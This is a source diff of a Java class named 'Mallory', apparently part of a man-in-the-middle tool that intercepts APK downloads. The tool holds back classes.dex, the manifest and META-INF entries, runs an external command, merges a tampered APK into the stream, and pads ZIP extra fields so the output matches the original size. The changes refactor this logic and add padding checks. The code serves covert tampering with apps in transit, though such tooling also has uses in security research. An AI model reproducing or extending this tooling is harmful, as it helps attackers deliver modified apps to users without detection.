@@ -30,7 +30,6 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.zip.Deflater;
-import org.apache.commons.compress.archivers.tar.TarConstants;
 import org.apache.commons.compress.archivers.zip.UnparseableExtraFieldData;
 import org.apache.commons.compress.archivers.zip.UnrecognizedExtraField;
 import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
@@ -59,6 +58,7 @@ public class Mallory {
     public static final int EXTRA_FIELD_SIZE = 8;
     public static final int MAX_EXTRA_SIZE = 40000;
     public static final int PAD_BLOCK_MAX = MAX_EXTRA_SIZE + EXTRA_FIELD_SIZE;
+    public static final int PAD_SIGNATURE = 0x12345;
     
     public static final int DEFAULT_PADDING_EXTRA = 4096;
     
@@ -116,12 +116,15 @@ public class Mallory {
     private File newApk;
     private File tempApk;
     
+    /**
+     * List of all sent files, with data and hashes.
+     */
     private Map<String, PostponedEntry> alMap;
-    private List<PostponedEntry> peList;
-    private List<PostponedEntry> prList;
     
+    /**
+     * Size of padding in bytes to desired size.
+     */
     private long padlen;
-    private int padfiles;
     
     /**
      * Entry point. 
@@ -203,10 +206,6 @@ public class Mallory {
         
         // List of all sent files, with data and hashes
         alMap = new HashMap<String, PostponedEntry>();
-        // List of postponed entries for further "processing".
-        peList = new ArrayList<PostponedEntry>(6);
-        // Priority postponed entries - at the end of the archive.
-        prList = new ArrayList<PostponedEntry>(6);
         
         // Output stream
         zop = new ZipArchiveOutputStream(fos);
@@ -275,22 +274,14 @@ public class Mallory {
             
             // META-INF files should be always on the end of the archive, 
             // thus add postponed files right before them
-            if (curName.startsWith(META_INF)){
-                // Add to priority postponed data (meta inf files @ the end of the file).
-                PostponedEntry pr = new PostponedEntry(ze, byteData, deflData);
-                prList.add(pr);
-                
-            } else if (CLASSES.equalsIgnoreCase(curName)
+            if (curName.startsWith(META_INF)
+                 || CLASSES.equalsIgnoreCase(curName)
                  || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
-                
                 // Capturing interesting files for us and store for later.
                 // If the file is not interesting, send directly to the stream.
-                
-                 if (!quiet)
+                if (!quiet)
                     System.err.println("### Interesting file, postpone sending!!!");
                  
-                 PostponedEntry pe = new PostponedEntry(ze, byteData, deflData);
-                 peList.add(pe);
             } else {
                 // Write ZIP entry to the archive
                 zop.putArchiveEntry(ze);
@@ -367,22 +358,22 @@ public class Mallory {
                     System.err.println("Command executed. Return value: " + child.exitValue());
                 
             } catch (IOException e) {
+                if (!quiet) e.printStackTrace(System.err);
             }
         }
         
         //
-        // Now read new APK file with ZipInputStream and push new/modified files to the ZOP
+        // Now read new APK file with ZipInputStream and push new/modified files to the ZOP.
         //
         fis = new FileInputStream(newApk);
         zip = new ZipArchiveInputStream(fis);
         
         // Merge tampered APK to the final, but in this first time
         // do it to the external buffer in order to get final apk size.
-        // Copy state of the ZOP to the external variables. 
+        // Backup ZOP state to the clonned instance.
         zop.flush();
         
         long writtenBeforeDiff = zop.getWritten();
-        OutputStream cout = zop.getOut();
         
         ZipArchiveOutputStream zop_back = zop;
         zop = zop.cloneThis();
@@ -412,11 +403,11 @@ public class Mallory {
         long endOfCentralDir = END_OF_CENTRAL_DIR_SIZE;
         
         // Determine number of bytes to add to APK.
-        // padlen is number of bytes missing in APK to meet desired size in bytes (overhead for extra fields is nto included).
+        // padlen is number of bytes missing in APK to meet desired size in bytes.
         padlen = outBytes - (writtenAfterCentralDir + endOfCentralDir);
         
         // Compute number of files needed for padding.
-        padfiles = (int) Math.ceil((double)padlen / (double)(PAD_BLOCK_MAX));
+        int padfiles = (int) Math.ceil((double)padlen / (double)(PAD_BLOCK_MAX));
         
         if (!quiet)
             System.err.println(String.format("Remaining to pad=%d, padfiles=%d "
@@ -432,7 +423,7 @@ public class Mallory {
             throw new IllegalStateException("Padlen cannot be negative, please increase padding size");
         }
                 
-        // Merge again, now with pre-defined pad comment size.
+        // Merge again, now with pre-defined padding size.
         fis = new FileInputStream(newApk);
         zip = new ZipArchiveInputStream(fis);
         // Revert changes - use clonned writer stream.
@@ -440,7 +431,7 @@ public class Mallory {
         
         long writtenBeforeDiff2 = zop.getWritten();
         
-        // Merge tampered APK, now for real.
+        // Merge tampered APK, now for real, now with computed padding.
         mergeTamperedApk(true);
         zop.flush();
         
@@ -462,27 +453,42 @@ public class Mallory {
                     writtenReally, centralDirLen2, endOfCentralDir, zop.getCdOffset(),
                     padlen, writtenReally + endOfCentralDir, outBytes));
         
+        // Should always be same
+        if (!quiet && writtenBeforeDiff!=writtenBeforeDiff2){
+            System.err.println(String.format("Warning! Size before merge from pass1 and pass2 does not match."));
+        }
+        
+        // If size is different, something went wrong.
+        if (!quiet && ((writtenReally + endOfCentralDir) != outBytes)){
+            System.err.println(String.format("Warning! Output size differs from desired size."));
+        }
+        
         zop.close();
         fos.close();
         
         if (!quiet)
-            System.err.println( "THE END!" );
+            System.err.println("THE END!");
     }
     
     /**
      * Adds given number of bytes as a null padding to extra field.
+     * Minimal padding is 8B. Maximal padding is PAD_BLOCK_MAX.
      * 
      * @param ze
      * @param padlen 
      */
     public void addExtraPadding(ZipArchiveEntry ze, int padlen){
         if (padlen < EXTRA_FIELD_SIZE){
-            throw new IllegalArgumentException("Cannot add padding less than 8 B (due to compulsory extra field structure)");
+            throw new IllegalArgumentException("Cannot add padding less than 8 B (due to compulsory extra field structure). Given size " + padlen);
+        }
+        
+        if (padlen > PAD_BLOCK_MAX){
+            throw new IllegalArgumentException("Specified padding is too big, maximal size is " + PAD_BLOCK_MAX + " given size is " + padlen);
         }
         
         byte[] paddBuff = new byte[padlen-EXTRA_FIELD_SIZE];
         UnrecognizedExtraField zextra =  new UnrecognizedExtraField();
-        zextra.setHeaderId(new ZipShort(0x123456));
+        zextra.setHeaderId(new ZipShort(PAD_SIGNATURE));
         zextra.setLocalFileDataData(new byte[0]);
         zextra.setCentralDirectoryData(paddBuff);
         
@@ -490,7 +496,9 @@ public class Mallory {
     }
     
     /**
-     * Computes padding needed to add to a single file in extras.
+     * Computes padding needed to be added to a single file in extra field.
+     * Takes maximum block size into consideration, distribution of
+     * bytes among different files (minimal padding for one file is 8B).
      * 
      * @return 
      */
@@ -524,17 +532,20 @@ public class Mallory {
      * Reads tampered APK file (zip object is prepared for this file prior 
      * this function call).
      * 
-     * If some file differs, newly created file is merged to the output zip stream.
+     * If a) file differs or b) file is new, it is added to the output zip stream.
      * 
+     * Method also handles padding to a given size. Attribute padlen is used,
+     * if addPadding is true, padlen bytes are distributed to {new, modiffied} 
+     * files in extra field in central directory. 
+     * 
+     * @param addPadding
      * @throws IOException 
      */
     public void mergeTamperedApk(boolean addPadding) throws IOException{
         // Read the tampered archive
         ZipArchiveEntry ze = zip.getNextZipEntry();
         
-        int padfilesLeft = padfiles;
         long padlenLeft = padlen;
-        
         while(ze!=null){
             
             // Data for entry
@@ -626,6 +637,10 @@ public class Mallory {
             }
             
             ze = zip.getNextZipEntry();
+        }
+        
+        if (!quiet && addPadding && padlenLeft > 0){
+            System.err.println("Warning! Not enough modified files to add required padding. Left: " + padlenLeft + "/" + padlen);
         }
     }
     
